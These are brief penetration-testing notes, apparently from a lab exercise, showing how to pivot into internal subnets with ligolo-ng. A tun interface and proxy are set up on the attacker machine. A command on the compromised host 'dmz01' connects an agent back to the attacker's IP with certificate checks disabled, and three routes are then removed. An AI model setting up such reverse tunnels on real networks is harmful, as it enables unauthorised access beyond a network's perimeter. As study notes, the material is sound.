- Run on attacker
```
sudo ip tuntap add user rohaki mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

- Run on dmz01 
```
./agent -connect $tun0_ip:11601 -ignore-cert
```

- Run on attacker
```
sudo ip route del 172.16.0.0/24
sudo ip route del 172.18.0.0/24
sudo ip route del 172.16.8.0/24
```
